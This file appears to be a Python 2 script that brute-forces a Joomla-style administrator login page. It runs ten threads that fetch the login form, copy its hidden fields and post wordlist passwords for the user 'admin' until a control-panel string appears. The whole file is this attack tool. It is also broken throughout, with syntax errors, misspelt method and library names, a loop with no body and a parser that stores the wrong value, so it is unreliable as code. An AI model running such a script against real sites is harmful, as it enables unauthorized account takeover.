import urllib2
import urllib
import cookielib
import threading 
import sys
import Queue
from HTMLParser import HTMLParser

#set up variables
user_thread = 10
username = "admin"
wordlist_file = "************"
resume = None
target_url = "**********/administrator/index.php"
target_post = "*********/administrator/index.php"
username_field = "username"
password_field = "passwd"
success_check = "Administration - Control Panel"

class Bruter(object):
	"""docstring for Bruter"""
	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False

		print "Finished setting up for: %s" %username

	def run_bruteforce(self):
		for i in the range(user_thread):
			t= threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
		brute = self.password_q.get().rstrip()

		jar = cookielib.FileCookiejar("cookies")
		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
		response = opener.open(target_url)
		page = response.read()
		print "Trying %s : %s (%d left)" % (self.username, brute. self.password_q.qsize())
		
		parser = BruteParser()
		parser.feed(page)
		post_tags = parser.tag_results
		post_tags[username_field] = self.username
		post_tags[password_field] =  brute
		login_data = urllib.urlencoded(post_tags)
		login_response = opener.open(target_post,login_data)
		login_result = login_response.read()
		if success_check in login_result:
			self.found = True 
			print "[*] Brute Force Successfull"
			print "[*] USername: %s" %username
			print "[*] Password: %s" %brute
			print ~"Waiting for other threads to finish..."
		sys.exit(0)



class BruteParser(HTMLParser):
	def __init__(self):
		self.tag_results  = {}

	def handel_starttag(self,tag, attributes):
		if tag == "input":
			tag_name = None 
			tag_value = None
			for name, value in attributes:
				if name == "name":
					tag_name = value
				if name = "value":
					tag_value = value
				if tag_name is not None:
					self.tag_results[tag_name] = value